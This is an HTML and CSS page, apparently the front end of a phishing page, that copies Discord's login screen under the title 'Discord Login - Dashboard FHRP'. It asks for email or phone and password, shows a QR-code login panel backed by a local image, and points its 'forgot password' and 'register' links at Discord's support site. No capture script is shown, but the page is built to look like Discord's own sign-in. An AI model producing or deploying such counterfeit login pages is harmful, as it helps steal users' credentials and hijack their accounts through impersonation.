<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Discord Login - Dashboard FHRP </title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');

    /* Reset and basics */
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #5865F2 0%, #23272A 100%);
      font-family: 'Inter', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #DCDDDE;
    }

    .login-container {
      background-color: #2F3136;
      border-radius: 12px;
      box-shadow: 0 4px 24px rgb(0 0 0 / 0.6);
      width: 900px;
      max-width: 95vw;
      display: flex;
      padding: 40px 50px;
    }

    .form-section {
      flex: 1;
      margin-right: 60px;
    }

    .form-section h1 {
      color: white;
      font-weight: 700;
      font-size: 28px;
      margin-bottom: 6px;
    }

    .form-section p {
      color: #B9BBBE;
      font-weight: 400;
      margin-top: 0;
      margin-bottom: 24px;
      font-size: 16px;
    }

    label {
      display: block;
      font-size: 12px;
      font-weight: 600;
      color: #B9BBBE;
      margin-bottom: 6px;
      text-transform: uppercase;
      letter-spacing: 0.1em;
    }

    input {
  width: 100%;
  background-color: #202225;
  border: none;
  border-radius: 6px;
  padding: 14px 16px;
  color: black;          /* changed from white to black */
  font-size: 16px;
  margin-bottom: 20px;
  transition: background-color 0.15s ease-in-out;
}

input:focus {
  outline: none;
  background-color: #2C2F33;
  box-shadow: 0 0 0 2px #5865F2;
  color: black;          /* also keep text black on focus */
}

    .forgot-link {
      font-size: 14px;
      color: #5865F2;
      text-decoration: none;
      display: inline-block;
      margin-bottom: 28px;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    button {
      background-color: #5865F2;
      border: none;
      border-radius: 6px;
      color: white;
      font-weight: 600;
      font-size: 16px;
      padding: 14px;
      cursor: pointer;
      width: 100%;
      transition: background-color 0.15s ease-in-out;
    }

    button:hover {
      background-color: #4752C4;
    }

    .register-text {
      font-size: 14px;
      color: #B9BBBE;
      margin-top: 16px;
    }

    .register-text a {
      color: #5865F2;
      text-decoration: none;
      font-weight: 600;
    }

    .register-text a:hover {
      text-decoration: underline;
    }

    .qr-section {
      width: 280px;
      color: #B9BBBE;
      text-align: center;
      font-size: 14px;
      line-height: 1.4;
      user-select: none;
    }

    .qr-section img {
      width: 180px;
      margin-bottom: 28px;
      border-radius: 12px;
      background-color: white;
      padding: 20px;
    }

    .qr-section strong {
      color: white;
      font-weight: 700;
    }

    .qr-section a {
      color: #5865F2;
      text-decoration: none;
      font-weight: 600;
    }

    .qr-section a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="form-section">
      <h1>Welcome back!</h1>
      <p>We're so excited to see you again!</p>
      <form id="loginForm" autocomplete="off">
        <label for="username">Email or Phone Number *</label>
        <input type="text" id="username" name="username" required autocomplete="username" />

        <label for="password">Password *</label>
        <input type="password" id="password" name="password" required autocomplete="current-password" />

        <a href="https://support.discord.com/hc/en-us" target="_blank" class="forgot-link" rel="noopener noreferrer">Forgot your password?</a>

        <button type="submit">Log In</button>

        <p class="register-text">
          Need an account? <a href="https://support.discord.com/hc/en-us" target="_blank" rel="noopener noreferrer">Register</a>
        </p>
      </form>
    </div>

    <div class="qr-section">
      <img src="./qr.png" alt="Discord QR Code" />
      <p><strong>Log in with QR Code</strong></p>
      <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
      <p><a href="#" style="font-weight: 600; color: #5865F2; text-decoration: none;">Or, sign in with passkey</a></p>
    </div>
  </div>

</html>
